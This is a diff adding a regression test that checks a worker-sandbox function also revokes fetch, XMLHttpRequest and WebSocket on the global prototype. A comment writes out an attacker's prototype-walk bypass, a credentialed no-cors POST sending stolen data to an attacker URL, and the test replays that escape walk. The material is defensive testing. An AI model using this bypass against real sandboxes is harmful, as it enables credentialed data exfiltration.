@@ -48,6 +48,56 @@ describe('revokeNetworkGlobals', () => {
     }
   });
 
+  it('revokes the network family when it lives on the global PROTOTYPE (real WorkerGlobalScope layout, not own properties)', () => {
+    // In a real worker, fetch/XMLHttpRequest/WebSocket/... are NOT own properties
+    // of the global instance. Per WebIDL ([Global] interface + [Exposed]
+    // operations/interface objects), they are configurable data properties on the
+    // global's PROTOTYPE chain (WorkerGlobalScope.prototype /
+    // DedicatedWorkerGlobalScope.prototype). An instance-only own-property shadow
+    // (lockToUndefined(scope, name)) hides `scope.fetch` and the bareword
+    // `Function('return fetch')()` lookup, but leaves the prototype-resident
+    // method LIVE and reachable through the constructor-chain + prototype-walk
+    // bypass:
+    //   Object.getPrototypeOf(globalThis).fetch.call(globalThis, attackerUrl, {
+    //     mode:'no-cors', method:'POST', credentials:'include', body:stolenScene })
+    // — a same-origin credentialed exfil POST that CORS does not block. This is
+    // the exact #8607 threat. This test is its regression guard and FAILS on
+    // own-prop-only revocation.
+    const proto: Record<string, unknown> = {};
+    for (const name of NET_GLOBALS) {
+      proto[name] = () => 'LIVE';
+    }
+    const scope = Object.create(proto) as Record<string, unknown>;
+
+    revokeNetworkGlobals(scope as unknown as typeof globalThis);
+
+    for (const name of NET_GLOBALS) {
+      // Direct / bareword access is undefined (own shadow on the instance)...
+      expect(scope[name]).toBeUndefined();
+      // ...AND the prototype-resident capability itself is revoked — the bypass
+      // an instance-only shadow leaves open.
+      const p = Object.getPrototypeOf(scope) as Record<string, unknown>;
+      expect(p[name]).toBeUndefined();
+    }
+
+    // Replay the attacker's exact descriptor-walk for every network name: starting
+    // from the (revoked) global, climb the prototype chain looking for a live
+    // callable. After revoke there must be none anywhere on the chain.
+    const walkCapability = (g: object, name: string): unknown => {
+      let p: object | null = g;
+      while ((p = Object.getPrototypeOf(p))) {
+        const d = Object.getOwnPropertyDescriptor(p, name);
+        if (d && typeof d.value === 'function') {
+          return (d.value as () => unknown).call(g);
+        }
+      }
+      return 'NO-CAPABILITY';
+    };
+    for (const name of NET_GLOBALS) {
+      expect(walkCapability(scope, name)).toBe('NO-CAPABILITY');
+    }
+  });
+
   it('defeats the documented constructor-chain escape to the real fetch', () => {
     const realm = makeRevokedRealm();
     // (0).constructor.constructor === the realm's real Function constructor. It
